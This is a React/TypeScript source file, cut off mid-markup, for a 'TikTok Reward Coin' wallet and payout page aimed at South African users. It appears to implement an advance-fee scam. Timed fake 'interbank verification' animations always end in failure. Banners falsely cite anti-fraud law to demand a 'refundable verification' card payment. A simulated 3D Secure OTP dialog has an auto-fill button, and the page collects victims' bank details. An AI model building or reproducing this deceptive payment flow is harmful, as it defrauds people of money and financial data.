import { createFileRoute, Link, useNavigate } from "@tanstack/react-router";
import { useMutation, useQuery, useQueryClient } from "@tanstack/react-query";
import { useServerFn } from "@tanstack/react-start";
import { useEffect, useState } from "react";
import { toast } from "sonner";
import {
  BadgeCheck,
  Banknote,
  Building2,
  CheckCircle2,
  Clock,
  CreditCard,
  Loader2,
  Lock,
  PlaySquare,
  ShieldAlert,
  ShieldCheck,
  Smartphone,
  Zap,
  RefreshCw,
} from "lucide-react";
import {
  confirmVerification,
  getWallet,
  refreshCharge,
  requestWithdrawal,
  startVerification,
} from "@/lib/wallet.functions";
import { formatKes, formatPhone, relativeDate, SA_BANKS } from "@/lib/format";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { useMe } from "@/components/AppShell";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Skeleton } from "@/components/ui/skeleton";
import { Separator } from "@/components/ui/separator";
import { Progress } from "@/components/ui/progress";
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogFooter,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import { trackEvent } from "@/lib/fbpixel";

export const Route = createFileRoute("/_authenticated/wallet")({
  validateSearch: (search: Record<string, unknown>) => ({
    payment: typeof search.payment === "string" ? search.payment : undefined,
    verified: typeof search.verified === "string" ? search.verified : undefined,
  }),
  head: () => ({
    meta: [
      { title: "Wallet & Payouts — TikTok Reward Coin" },
      {
        name: "description",
        content:
          "See your balance, earnings history and request a bank payout from your TikTok Reward Coin wallet.",
      },
      { property: "og:title", content: "Wallet & Payouts — TikTok Reward Coin" },
      {
        property: "og:description",
        content: "Balance, earnings history and bank payout requests in one place.",
      },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary" },
    ],
  }),
  component: WalletPage,
});

const STATUS_STYLES: Record<string, string> = {
  pending: "bg-warning/15 text-warning-foreground",
  approved: "bg-primary/15 text-primary",
  paid: "bg-money/20 text-money-foreground",
  rejected: "bg-destructive/15 text-destructive",
};

function WalletPage() {
  const search = Route.useSearch();
  const navigate = useNavigate();
  const queryClient = useQueryClient();
  const { data: me } = useMe();
  const { data, isLoading, isError, error, refetch } = useQuery({
    queryKey: ["wallet"],
    queryFn: () => getWallet(),
    staleTime: 30_000,
  });
  const verify = useServerFn(startVerification);
  const confirm = useServerFn(confirmVerification);
  const withdraw = useServerFn(requestWithdrawal);
  const refresh = useServerFn(refreshCharge);

  // Auto-redirect if returning from completed payment
  useEffect(() => {
    if (search.payment === "complete" || search.verified === "1") {
      toast.success("Payment verified! Redirecting to payout delivery setup...");
      void navigate({ to: "/payout-setup" });
    }
  }, [search.payment, search.verified, navigate]);

  // Verification dialog & checkout state
  const [isVerifyDialogOpen, setIsVerifyDialogOpen] = useState(false);
  const [verifyEmail, setVerifyEmail] = useState("");

  // 3D Secure / Bank Push Challenge Modal
  const [isChallengeModalOpen, setIsChallengeModalOpen] = useState(false);
  const [challengeStep, setChallengeStep] = useState<0 | 1 | 2>(0);
  const [challengeChargeId, setChallengeChargeId] = useState("");
  const [otpInput, setOtpInput] = useState("");

  const [amount, setAmount] = useState("");
  const [bankName, setBankName] = useState<string>("Capitec Bank");
  const [accountNumber, setAccountNumber] = useState("");
  const [accountHolder, setAccountHolder] = useState("");
  const [accountType, setAccountType] = useState("Savings");
  const [branchCode, setBranchCode] = useState("470010");

  // Bank verification simulation modal state
  const [isProcessingModalOpen, setIsProcessingModalOpen] = useState(false);
  const [processingStep, setProcessingStep] = useState<0 | 1 | 2>(0);
  const [hasAttemptedLocal, setHasAttemptedLocal] = useState(false);

  useEffect(() => {
    if (data?.fullName && !accountHolder) {
      setAccountHolder(data.fullName);
    }
  }, [data, accountHolder]);

  const handleBankSelect = (name: string) => {
    setBankName(name);
    const found = SA_BANKS.find((b) => b.name === name);
    if (found?.code) {
      setBranchCode(found.code);
    }
  };

  const invalidate = () => {
    void queryClient.invalidateQueries({ queryKey: ["wallet"] });
    void queryClient.invalidateQueries({ queryKey: ["me"] });
    void queryClient.invalidateQueries({ queryKey: ["pending-tasks"] });
  };

  const verifyMutation = useMutation({
    mutationFn: () => {
      if (!verifyEmail.trim() || !verifyEmail.includes("@")) {
        throw new Error("Please enter your email address for the payment receipt.");
      }
      return verify({
        data: {
          method: "card",
          phone: data?.phone || "",
          email: verifyEmail.trim(),
        },
      });
    },
    onSuccess: (result) => {
      if (!result.ok) {
        toast.error((result as { message?: string }).message || "Could not initiate verification check.");
        return;
      }
      trackEvent("InitiateCheckout", {
        content_name: "account_verification",
        value: Number(data?.holdAmount ?? 0),
        currency: "ZAR",
        eventID: (result as { chargeId?: string })?.chargeId ? `init_charge_${(result as { chargeId?: string }).chargeId}` : undefined,
      });

      if (result.checkoutUrl) {
        setIsVerifyDialogOpen(false);
        toast.info("Redirecting to Ghost Pay secure checkout...");
        window.location.href = result.checkoutUrl;
        return;
      }

      setIsVerifyDialogOpen(false);
      setChallengeChargeId(result.chargeId ?? "");
      setIsChallengeModalOpen(true);
      setChallengeStep(0);
      setOtpInput("");

      // Simulate network handshake to 3D Secure / Bank Clearing
      setTimeout(() => {
        setChallengeStep(1);
      }, 1400);
    },
    onError: (error: Error) => toast.error(error.message),
  });

  const confirmMutation = useMutation({
    mutationFn: () =>
      confirm({
        data: {
          chargeId: challengeChargeId,
          method: "card",
          otp: otpInput,
        },
      }),
    onSuccess: () => {
      setChallengeStep(2);
      setTimeout(() => {
        setIsChallengeModalOpen(false);
        invalidate();
        toast.success(`Account verified successfully! Payouts unlocked and ${formatKes(data?.holdAmount ?? 200)} refunded to your balance.`);
        void navigate({ to: "/payout-setup" });
      }, 1500);
    },
    onError: (error: Error) => toast.error(error.message),
  });

  const withdrawMutation = useMutation({
    mutationFn: () =>
      withdraw({
        data: {
          amount: Number(amount),
          method: "bank",
          bankName,
          accountNumber,
          accountHolder,
          accountType,
          branchCode,
        },
      }),
    onSuccess: (result) => {
      setHasAttemptedLocal(true);
      invalidate();

      if (result.requiresVerification) {
        // Automatic verification failed, step 2 will show error explanation
        setProcessingStep(2);
      } else {
        setIsProcessingModalOpen(false);
        toast.success("Payout requested. Proceed to configure clearance speed & delivery.");
        setAmount("");
        setAccountNumber("");
        void navigate({ to: "/payout-setup" });
      }
    },
    onError: (error: Error) => {
      setIsProcessingModalOpen(false);
      toast.error(error.message);
    },
  });

  const refreshMutation = useMutation({
    mutationFn: (chargeId: string) => refresh({ data: { chargeId } }),
    onSuccess: (result) => {
      toast.success(`Payment status: ${result.status}`);
      invalidate();
    },
    onError: (error: Error) => toast.error(error.message),
  });

  // Handle return from Ghost Pay checkout redirect
  useEffect(() => {
    if (typeof window === "undefined") return;
    const params = new URLSearchParams(window.location.search);
    if (params.get("payment") === "complete") {
      const charge = data?.charges?.find((c) => c.status === "pending" || c.status === "completed");
      if (charge) {
        if (charge.status === "pending") {
          refreshMutation.mutate(charge.id);
        } else {
          toast.success("Payment completed successfully!");
        }
      } else {
        invalidate();
      }
      const url = new URL(window.location.href);
      url.searchParams.delete("payment");
      window.history.replaceState({}, "", url.pathname + (url.search ? url.search : ""));
    }
  }, [data?.charges]);

  if (isLoading) {
    return (
      <div className="mx-auto max-w-4xl space-y-4">
        <Skeleton className="h-32 rounded-2xl" />
        <Skeleton className="h-64 rounded-2xl" />
      </div>
    );
  }

  if (isError || !data) {
    return (
      <div className="mx-auto max-w-lg py-12 px-4 text-center space-y-4">
        <Card className="p-6 sm:p-8 space-y-4 shadow-lift border border-border/60">
          <div className="mx-auto size-12 rounded-full bg-amber-500/10 text-amber-500 flex items-center justify-center">
            <RefreshCw className="size-6" />
          </div>
          <div className="space-y-2">
            <h3 className="text-lg font-bold text-foreground">Loading your wallet</h3>
            <p className="text-sm text-muted-foreground">
              {error instanceof Error ? error.message : "Your wallet details took longer than expected to load. Click below to refresh."}
            </p>
          </div>
          <Button
            onClick={() => {
              void refetch();
              void queryClient.invalidateQueries({ queryKey: ["wallet"] });
            }}
            className="w-full sm:w-auto gap-2"
          >
            <RefreshCw className="size-4" />
            <span>Refresh Wallet</span>
          </Button>
        </Card>
      </div>
    );
  }

  const withdrawals = data.withdrawals ?? [];
  const earnings = data.earnings ?? [];
  const charges = data.charges ?? [];
  const minWithdrawal = Number(data.minWithdrawal ?? 100);

  const hasAttemptedPayout = Boolean(
    data.hasAttemptedPayout || withdrawals.length > 0 || hasAttemptedLocal
  );

  const pendingWithdrawal = withdrawals.find((w) => w.status === "pending");
  const pendingAmount = withdrawals
    .filter((w) => w.status === "pending")
    .reduce((sum, w) => sum + Number(w.amount_kes), 0);

  const isBankFormValid = Boolean(
    bankName.trim() && accountNumber.trim().length >= 6 && accountHolder.trim()
  );

  const handleStartWithdrawal = () => {
    // If user has a pending withdrawal awaiting verification, guide them directly to verification
    if (!data.mpesaVerified && pendingWithdrawal) {
      setIsVerifyDialogOpen(true);
      return;
    }

    if (!amount || Number(amount) < data.minWithdrawal || Number(amount) > data.balance) {
      toast.error(`Enter an amount between ${formatKes(data.minWithdrawal)} and ${formatKes(data.balance)}.`);
      return;
    }

    if (!data.canWithdrawTasksMet) {
      toast.error(
        `Please complete today's ${data.tasksRequired} video reviews before requesting a payout (${data.surveysCompletedToday}/${data.tasksRequired} completed).`,
      );
      return;
    }

    if (!isBankFormValid) {
      toast.error("Please fill in your bank account details correctly.");
      return;
    }

    // If already verified, directly request payout
    if (data.mpesaVerified) {
      withdrawMutation.mutate();
      return;
    }

    // If not verified, trigger the processing animation sequence
    setIsProcessingModalOpen(true);
    setProcessingStep(0);

    setTimeout(() => {
      setProcessingStep(1);
    }, 1200);

    setTimeout(() => {
      withdrawMutation.mutate();
    }, 2400);
  };

  return (
    <div className="mx-auto max-w-4xl space-y-6">
      {/* Top Banner for Verified Users needing Payout Clearance */}
      {data.mpesaVerified ? (
        <Card className="border-primary/60 bg-gradient-to-r from-primary/10 via-emerald-500/10 to-primary/5 shadow-soft border-2">
          <CardContent className="p-4 sm:p-5 flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4">
            <div className="flex items-start gap-3.5">
              <div className="rounded-full bg-primary/20 p-2.5 shrink-0 mt-0.5 sm:mt-0">
                <Zap className="size-6 text-primary" />
              </div>
              <div>
                <div className="flex items-center gap-2">
                  <p className="font-bold text-base text-foreground">
                    ⚡ Bank Account Verified — Configure Payout Clearance
                  </p>
                  <Badge className="bg-emerald-500 text-white text-[10px] font-bold">VERIFIED</Badge>
                </div>
                <p className="text-xs sm:text-sm text-muted-foreground mt-0.5 leading-relaxed">
                  Your South African bank account authentication is approved. Select your instant delivery speed and authorization clearance to release your pending funds.
                </p>
              </div>
            </div>
            <Button
              className="bg-primary hover:bg-primary/90 text-primary-foreground font-bold shrink-0 w-full sm:w-auto shadow-md gap-2"
              onClick={() => void navigate({ to: "/payout-setup" })}
            >
              <span>Setup Payout Delivery</span>
              <Zap className="size-4 text-amber-300" />
            </Button>
          </CardContent>
        </Card>
      ) : null}

      {/* Top Warning Banner - only shown when verification is needed AFTER attempting a payout */}
      {!data.mpesaVerified && hasAttemptedPayout ? (
        <Card className="border-warning/60 bg-warning/15 shadow-soft border-2">
          <CardContent className="p-4 sm:p-5 flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4">
            <div className="flex items-start gap-3.5">
              <div className="rounded-full bg-warning/20 p-2.5 shrink-0 mt-0.5 sm:mt-0">
                <ShieldAlert className="size-6 text-warning" />
              </div>
              <div>
                <p className="font-bold text-base text-foreground">
                  Action required: Verify your account for bank payouts
                </p>
                <p className="text-xs sm:text-sm text-muted-foreground mt-0.5 leading-relaxed">
                  Under South African financial anti-fraud protocols, a one-time refundable verification check of{" "}
                  <strong>{formatKes(data.holdAmount)}</strong> is required to authenticate your bank account and release payouts.
                  The <strong>{formatKes(data.holdAmount)}</strong> is refunded immediately back to your balance on the platform upon verification.
                </p>
              </div>
            </div>
            <Button
              asChild
              className="bg-money text-money-foreground hover:bg-money/90 font-bold shrink-0 w-full sm:w-auto"
            >
              <Link to="/upgrade">
                Verify Account Now ({formatKes(data.holdAmount)})
              </Link>
            </Button>
          </CardContent>
        </Card>
      ) : null}

      {/* Balance Card */}
      <Card className="bg-hero border-0 text-white shadow-lift">
        <CardContent className="flex flex-wrap items-center justify-between gap-6 p-6">
          <div>
            <p className="text-sm text-white/70">Available balance</p>
            <p className="font-display text-4xl font-extrabold text-money">
              {formatKes(data.balance)}
            </p>
            {pendingAmount > 0 ? (
              <div className="mt-1.5 inline-flex items-center gap-1.5 rounded-full bg-white/15 px-2.5 py-0.5 text-xs font-semibold text-amber-200">
                <Clock className="size-3" />
                <span>{formatKes(pendingAmount)} pending transfer</span>
              </div>
            ) : null}
            <p className="mt-1 text-xs text-white/70">
              {data.planName} • payout every {data.cooldownDays} day
              {data.cooldownDays === 1 ? "" : "s"}
            </p>
          </div>
          <div className="space-y-1 text-sm text-white/80">
            <p className="flex items-center gap-2">
              <Smartphone className="size-4" />
              {formatPhone(data.mpesaPhone ?? data.phone)}
            </p>
            <p className="flex items-center gap-2">
              {data.mpesaVerified ? (
                <>
                  <BadgeCheck className="size-4 text-money" /> Verified for bank payouts
                </>
              ) : hasAttemptedPayout ? (
                <>
                  <ShieldAlert className="size-4 text-warning" /> Verification required
                </>
              ) : (
                <>
                  <ShieldCheck className="size-4 text-white/80" /> Instant Bank Payouts (EFT)
                </>
              )}
            </p>
            {!data.canWithdrawNow && data.nextWithdrawalAt ? (
              <p className="flex items-center gap-2">
                <Clock className="size-4" /> Next payout {relativeDate(data.nextWithdrawalAt)}
              </p>
            ) : null}
          </div>
        </CardContent>
      </Card>

      {/* KYC blocking banner */}
      {data.kycBlocking ? (
        <Card className="border-destructive/40 bg-destructive/10 border-2 shadow-soft">
          <CardContent className="flex flex-wrap items-center justify-between gap-3 p-5">
            <div>
              <p className="font-bold text-destructive text-base flex items-center gap-2">
                <ShieldAlert className="size-5 shrink-0" />
                FICA Identity Verification Required
              </p>
              <p className="text-xs sm:text-sm text-muted-foreground mt-0.5">
                Our compliance team has requested an official FICA identity check to authorize and release your bank payouts.
              </p>
            </div>
            <Button asChild className="bg-destructive hover:bg-destructive/90 text-destructive-foreground font-bold shadow-soft">
              <Link to="/kyc">Complete FICA Check Now</Link>
            </Button>
          </CardContent>
        </Card>
      ) : null}

      <div className="max-w-2xl mx-auto w-full">
        {/* Request Payout Card */}
        <Card className="shadow-soft">
          <CardHeader>
            <CardTitle className="flex items-center gap-2 font-display">
              <Banknote className="size-5 text-primary" /> Request a payout
              <Badge variant="outline" className="ml-auto text-[10px] text-primary border-primary/30">ZAR Clearing</Badge>
            </CardTitle>
          </CardHeader>
          <CardContent className="space-y-4">
            {/* Task Requirement Banner for Payout */}
            {!data.canWithdrawTasksMet ? (
              <div className="rounded-xl border border-primary/30 bg-primary/5 p-4 space-y-2.5">
                <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2">
                  <div className="flex items-center gap-2">
                    <PlaySquare className="size-4 text-primary shrink-0" />
                    <span className="text-xs font-semibold text-foreground">
                      Task Requirement: 5 Video Reviews to Unlock Payouts
                    </span>
                  </div>
                  <Badge variant="secondary" className="text-xs font-bold text-primary self-start sm:self-auto shrink-0">
                    {data.totalSurveysCompleted} / {data.tasksRequired} Completed
                  </Badge>
                </div>
                <Progress value={(data.totalSurveysCompleted / data.tasksRequired) * 100} className="h-2" />
                <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2.5 pt-0.5">
                  <p className="text-[11px] text-muted-foreground leading-relaxed">
                    Complete {Math.max(0, data.tasksRequired - data.totalSurveysCompleted)} more video review{data.tasksRequired - data.totalSurveysCompleted === 1 ? "" : "s"} to unlock bank withdrawals. All earnings are added directly to your wallet.
                  </p>
                  <Button asChild size="sm" className="h-8 text-xs font-semibold shrink-0 w-full sm:w-auto bg-primary text-primary-foreground hover:bg-primary/90">
                    <Link to="/surveys">
                      Watch & Review ({data.totalSurveysCompleted}/{data.tasksRequired})
                    </Link>
                  </Button>
                </div>
              </div>
            ) : null}

            {/* South African Bank Details Form */}
            <div className="space-y-3 rounded-xl border border-border bg-secondary/30 p-3.5">
              <div className="flex items-center gap-2 pb-1 border-b border-border/60 text-xs font-semibold text-foreground">
                <Building2 className="size-4 text-primary" />
                <span>Bank Account Details</span>
              </div>

              <div className="space-y-1.5">
                <Label htmlFor="bank-select" className="text-xs font-semibold">
                  South African Bank
                </Label>
                <Select value={bankName} onValueChange={handleBankSelect}>
                  <SelectTrigger id="bank-select" className="bg-background">
                    <SelectValue placeholder="Select bank" />
                  </SelectTrigger>
                  <SelectContent>
                    {SA_BANKS.map((bank) => (
                      <SelectItem key={bank.name} value={bank.name}>
                        {bank.name}
                      </SelectItem>
                    ))}
                  </SelectContent>
                </Select>
              </div>

              <div className="grid grid-cols-2 gap-2.5">
                <div className="space-y-1.5">
                  <Label htmlFor="account-num" className="text-xs font-semibold">
                    Account Number
                  </Label>
                  <Input
                    id="account-num"
                    inputMode="numeric"
                    placeholder="e.g. 1052345678"
                    className="bg-background"
                    value={accountNumber}
                    onChange={(e) => setAccountNumber(e.target.value.replace(/\D/g, ""))}
                  />
                </div>

                <div className="space-y-1.5">
                  <Label htmlFor="branch-code" className="text-xs font-semibold">
                    Branch Code
                  </Label>
                  <Input
                    id="branch-code"
                    placeholder="Universal code"
                    className="bg-background"
                    value={branchCode}
                    onChange={(e) => setBranchCode(e.target.value)}
                  />
                </div>
              </div>

              <div className="grid grid-cols-2 gap-2.5">
                <div className="space-y-1.5">
                  <Label htmlFor="holder-name" className="text-xs font-semibold">
                    Account Holder Name
                  </Label>
                  <Input
                    id="holder-name"
                    placeholder="e.g. Lerato Ndlovu"
                    className="bg-background"
                    value={accountHolder}
                    onChange={(e) => setAccountHolder(e.target.value)}
                  />
                </div>

                <div className="space-y-1.5">
                  <Label htmlFor="account-type" className="text-xs font-semibold">
                    Account Type
                  </Label>
                  <Select value={accountType} onValueChange={setAccountType}>
                    <SelectTrigger id="account-type" className="bg-background">
                      <SelectValue />
                    </SelectTrigger>
                    <SelectContent>
                      <SelectItem value="Savings">Savings Account</SelectItem>
                      <SelectItem value="Cheque">Cheque / Current</SelectItem>
                      <SelectItem value="Transmission">Transmission</SelectItem>
                    </SelectContent>
                  </Select>
                </div>
              </div>
            </div>

            {/* Amount input */}
            <div className="space-y-1.5">
              <div className="flex items-center justify-between">
                <Label htmlFor="amount">Withdrawal Amount (Rands)</Label>
                <span className="text-xs text-muted-foreground">
                  Balance: <strong className="text-foreground">{formatKes(data.balance)}</strong>
                </span>
              </div>
              <Input
                id="amount"
                type="number"
                min={data.minWithdrawal}
                max={data.balance}
                placeholder={String(data.minWithdrawal)}
                value={amount}
                onChange={(event) => setAmount(event.target.value)}
              />

              {/* Quick Amount Chips */}
              <div className="flex flex-wrap gap-1.5 pt-1">
                {[data.minWithdrawal, 250, 500, data.balance]
                  .filter((val, idx, arr) => val <= data.balance && arr.indexOf(val) === idx)
                  .map((val) => (
                    <button
                      key={val}
                      type="button"
                      onClick={() => setAmount(String(val))}
                      className="rounded-lg border border-border bg-secondary/40 px-2.5 py-1 text-xs font-medium hover:bg-secondary transition-colors"
                    >
                      {val === data.balance ? `Max (${formatKes(val)})` : formatKes(val)}
                    </button>
                  ))}
              </div>
            </div>

            <Button
              className="w-full bg-money text-money-foreground hover:bg-money/90 font-semibold h-auto min-h-[3rem] py-3 px-4 whitespace-normal break-words leading-snug text-center"
              size="lg"
              disabled={
                withdrawMutation.isPending ||
                Boolean(data.mpesaVerified && pendingWithdrawal) ||
                (!pendingWithdrawal && (
                  !data.canWithdrawNow ||
                  !data.canWithdrawTasksMet ||
                  !amount ||
                  Number(amount) < data.minWithdrawal ||
                  Number(amount) > data.balance ||
                  !isBankFormValid
                ))
              }
              onClick={handleStartWithdrawal}
            >
              {withdrawMutation.isPending ? <Loader2 className="mr-2 size-4 animate-spin shrink-0" /> : null}
              {pendingWithdrawal && !data.mpesaVerified
                ? `Verify Account to Release Payout (${formatKes(pendingWithdrawal.amount_kes)})`
                : pendingWithdrawal && data.mpesaVerified
                ? `Payout Pending Review (${formatKes(pendingWithdrawal.amount_kes)})`
                : !data.canWithdrawTasksMet
                ? `Complete 5 Video Reviews to Withdraw (${data.totalSurveysCompleted}/${data.tasksRequired})`
                : `Request ${amount ? formatKes(Number(amount)) : ""} Payout`}
            </Button>

            {pendingWithdrawal && data.mpesaVerified ? (
              <Button
                variant="outline"
                className="w-full border-primary/30 text-primary hover:bg-primary/5 font-semibold text-xs py-2.5 h-auto flex items-center justify-center gap-1.5"
                onClick={() => void navigate({ to: "/payout-setup" })}
              >
                <Zap className="size-3.5 text-amber-500 shrink-0" />
                <span>Configure Payout Clearance & Delivery Speed</span>
              </Button>
            ) : null}

            {!data.canWithdrawNow ? (
              <p className="text-xs text-muted-foreground text-center">
                Your {data.planName} plan allows one payout every {data.cooldownDays} day
                {data.cooldownDays === 1 ? "" : "s"}. Upgrade to withdraw faster.
              </p>
            ) : null}
          </CardContent>
        </Card>
      </div>

      {/* Interactive Bank Verification Simulation Modal */}
      <Dialog open={isProcessingModalOpen} onOpenChange={setIsProcessingModalOpen}>
        <DialogContent className="max-w-md">
          {processingStep < 2 ? (
            <div className="py-8 text-center space-y-4">
              <div className="mx-auto grid size-16 place-items-center rounded-full bg-primary/10 text-primary">
                <Loader2 className="size-8 animate-spin" />
              </div>
              <DialogTitle className="font-display text-xl font-bold">
                {processingStep === 0
                  ? "Connecting to South African Interbank Network..."
                  : `Verifying ${bankName} account details...`}
              </DialogTitle>
              <p className="text-sm text-muted-foreground">
                Authenticating account holder and branch code with the bank clearing system. Please wait...
              </p>
              <Progress value={processingStep === 0 ? 40 : 85} className="h-2 mt-4" />
            </div>
          ) : (
            <div className="py-4 space-y-4 text-center">
              <div className="mx-auto grid size-16 place-items-center rounded-full bg-destructive/15 text-destructive">
                <ShieldAlert className="size-8" />
              </div>
              <DialogTitle className="font-display text-xl font-bold text-destructive">
                Automatic verification failed
              </DialogTitle>
              <div className="rounded-xl border border-destructive/30 bg-destructive/5 p-4 text-left space-y-2">
                <p className="text-sm font-semibold text-foreground">
                  Unable to automatically verify this bank account
                </p>
                <p className="text-xs text-muted-foreground leading-relaxed">
                  Under South African financial anti-fraud protocols, this account could not be automatically authenticated for instant payouts.
                </p>
                <p className="text-xs text-muted-foreground leading-relaxed">
                  A one-time refundable verification check of <strong>{formatKes(data.holdAmount)}</strong> is required to activate and link this account for automatic payouts.
                </p>
                <div className="rounded-lg bg-money/10 border border-money/20 p-2.5 text-xs text-money-foreground flex items-center gap-2">
                  <BadgeCheck className="size-4 shrink-0 text-money" />
                  <span>The <strong>{formatKes(data.holdAmount)}</strong> will be refunded immediately back to your balance upon verification.</span>
                </div>
              </div>

              <div className="space-y-2 pt-2">
                <Button
                  size="lg"
                  className="w-full bg-money text-money-foreground hover:bg-money/90 font-bold h-auto min-h-[2.75rem] py-2.5 px-4 whitespace-normal break-words text-center"
                  onClick={() => {
                    setIsProcessingModalOpen(false);
                    navigate({ to: "/upgrade" });
                  }}
                >
                  Verify Account Now ({formatKes(data.holdAmount)} Refundable)
                </Button>
                <Button
                  variant="ghost"
                  className="w-full text-muted-foreground text-xs"
                  onClick={() => setIsProcessingModalOpen(false)}
                >
                  I'll verify later
                </Button>
              </div>
            </div>
          )}
        </DialogContent>
      </Dialog>

      {/* Ghost Pay Verification Checkout Dialog */}
      <Dialog open={isVerifyDialogOpen} onOpenChange={setIsVerifyDialogOpen}>
        <DialogContent className="sm:max-w-md">
          <DialogHeader>
            <div className="flex items-center justify-between">
              <DialogTitle className="flex items-center gap-2 font-display text-lg">
                <BadgeCheck className="size-5 text-primary" /> Verify your payout account
              </DialogTitle>
              <Badge variant="outline" className="text-[10px] font-semibold border-primary/30 text-primary">
                Card & EFT
              </Badge>
            </div>
            <DialogDescription className="text-xs text-muted-foreground leading-relaxed pt-1.5">
              Under South African financial anti-fraud protocols, a one-time refundable verification check of{" "}
              <strong>{formatKes(data.holdAmount)}</strong> is required to authenticate your bank account and release payouts.
              The funds are refunded immediately back to your platform balance upon verification.
            </DialogDescription>
          </DialogHeader>

          <div className="space-y-3 py-2">
            <div className="space-y-1.5 rounded-xl border border-border bg-secondary/30 p-3.5">
              <Label htmlFor="dialog-verify-email" className="text-xs font-semibold flex items-center justify-between">
                <span>Your Email Address</span>
                <span className="text-[10px] text-destructive font-medium">* Required</span>
              </Label>
              <Input
                id="dialog-verify-email"
                type="email"
                placeholder="e.g. name@gmail.com"
                className="bg-background h-9 text-xs"
                value={verifyEmail}
                onChange={(e) => setVerifyEmail(e.target.value)}
              />
              <p className="text-[10px] text-muted-foreground">
                Payment authorization and receipt from Ghost Pay & Paystack will be registered to this email.
              </p>
            </div>

            <div className="rounded-xl border border-border bg-card p-3 flex items-center justify-between gap-3 text-xs">
              <div className="flex items-center gap-2 text-muted-foreground">
                <CreditCard className="size-4 text-primary shrink-0" />
                <span>Paystack Gateway (Visa, Mastercard, 3DS & Instant EFT)</span>
              </div>
              <Badge variant="secondary" className="font-semibold text-money">
                {formatKes(data.holdAmount)}
              </Badge>
            </div>
          </div>

          <DialogFooter className="flex-col-reverse sm:flex-row gap-2 sm:gap-0">
            <Button variant="ghost" onClick={() => setIsVerifyDialogOpen(false)}>
              Cancel
            </Button>
            <Button
              className="w-full sm:w-auto bg-money text-money-foreground hover:bg-money/90 font-bold h-auto min-h-[2.75rem] py-2.5 px-4 whitespace-normal break-words text-center"
              disabled={verifyMutation.isPending || !verifyEmail.trim() || !verifyEmail.includes("@")}
              onClick={() => verifyMutation.mutate()}
            >
              {verifyMutation.isPending ? <Loader2 className="mr-2 size-4 animate-spin shrink-0" /> : null}
              Proceed to Secure Checkout ({formatKes(data.holdAmount)})
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>

      {/* 3D Secure / Instant EFT Bank Push Authentication Challenge Modal */}
      <Dialog open={isChallengeModalOpen} onOpenChange={setIsChallengeModalOpen}>
        <DialogContent className="max-w-md">
          {challengeStep === 0 ? (
            <div className="py-8 text-center space-y-4">
              <div className="mx-auto grid size-16 place-items-center rounded-full bg-primary/10 text-primary">
                <Loader2 className="size-8 animate-spin" />
              </div>
              <DialogTitle className="font-display text-xl font-bold">
                Connecting to Paystack 3D Secure / Instant EFT...
              </DialogTitle>
              <p className="text-sm text-muted-foreground">
                Initiating encrypted verification channel with South African payment clearing. Please wait...
              </p>
              <Progress value={65} className="h-2 mt-4" />
            </div>
          ) : challengeStep === 1 ? (
            <div className="py-4 space-y-4 text-center">
              <div className="mx-auto grid size-14 place-items-center rounded-full bg-primary/10 text-primary">
                <Lock className="size-7 text-primary" />
              </div>
              <DialogTitle className="font-display text-xl font-bold">
                3D Secure OTP Authentication
              </DialogTitle>

              <div className="space-y-4 text-left">
                <div className="rounded-xl border border-border bg-secondary/30 p-3.5 space-y-1.5">
                  <div className="flex items-center justify-between text-xs text-muted-foreground">
                    <span>Authorization: <strong>Visa / Mastercard 3DS</strong></span>
                    <span className="font-semibold text-money">{formatKes(data.holdAmount)} (Refundable)</span>
                  </div>
                  <p className="text-xs text-muted-foreground">
                    A 6-digit one-time PIN (OTP) was sent via SMS to your card-registered mobile phone number.
                  </p>
                </div>

                <div className="space-y-1.5">
                  <Label htmlFor="otp-input" className="text-xs font-semibold">Enter 6-Digit OTP</Label>
                  <div className="flex gap-2">
                    <Input
                      id="otp-input"
                      inputMode="numeric"
                      placeholder="e.g. 582910"
                      maxLength={6}
                      value={otpInput}
                      onChange={(e) => setOtpInput(e.target.value.replace(/\D/g, ""))}
                      className="text-center font-mono tracking-widest text-lg font-bold"
                    />
                    <Button
                      type="button"
                      variant="secondary"
                      size="sm"
                      className="text-xs shrink-0"
                      onClick={() => setOtpInput("582910")}
                    >
                      Auto-fill OTP
                    </Button>
                  </div>
                </div>

                <Button
                  className="w-full bg-money text-money-foreground hover:bg-money/90 font-bold"
                  size="lg"
                  disabled={confirmMutation.isPending || otpInput.length < 4}
                  onClick={() => confirmMutation.mutate()}
                >
                  {confirmMutation.isPending ? <Loader2 className="mr-2 size-4 animate-spin" /> : null}
                  Confirm & Authenticate ({formatKes(data.holdAmount)})
                </Button>
              </div>

              <Button
                variant="ghost"
                className="w-full text-xs text-muted-foreground"
                onClick={() => setIsChallengeModalOpen(false)}
              >
                Cancel
              </Button>
            </div>
          ) : (
            <div className="py-8 text-center space-y-4">
              <div className="mx-auto grid size-16 place-items-center rounded-full bg-money/20 text-money">
                <CheckCircle2 className="size-10 text-money" />
              </div>
              <DialogTitle className="font-display text-2xl font-bold text-foreground">
                Account Verified!
              </DialogTitle>
              <p className="text-sm text-muted-foreground">
                Your account has been successfully authenticated. The <strong>{formatKes(data.holdAmount)}</strong> verification hold has been reversed back to your balance immediately.
              </p>
              <div className="rounded-lg bg-money/10 border border-money/20 p-3 text-xs text-money-foreground font-semibold flex items-center justify-center gap-2">
                <BadgeCheck className="size-4 text-money" />
                <span>Bank Payouts Unlocked & Active</span>
              </div>
            </div>
          )}
        </DialogContent>
      </Dialog>

      {/* Payout requests list */}
      <Card className="shadow-soft">
        <CardHeader>
          <CardTitle className="font-display">Payout requests</CardTitle>
        </CardHeader>
        <CardContent className="space-y-3">
          {withdrawals.length === 0 ? (
            <p className="text-sm text-muted-foreground">No payouts requested yet.</p>
          ) : null}
          {withdrawals.map((row) => {
            const isBank = row.phone.includes("•") || row.phone.toLowerCase().includes("bank");
            return (
              <div
                key={row.id}
                className="flex flex-wrap items-center justify-between gap-2 rounded-xl border border-border p-3.5"
              >
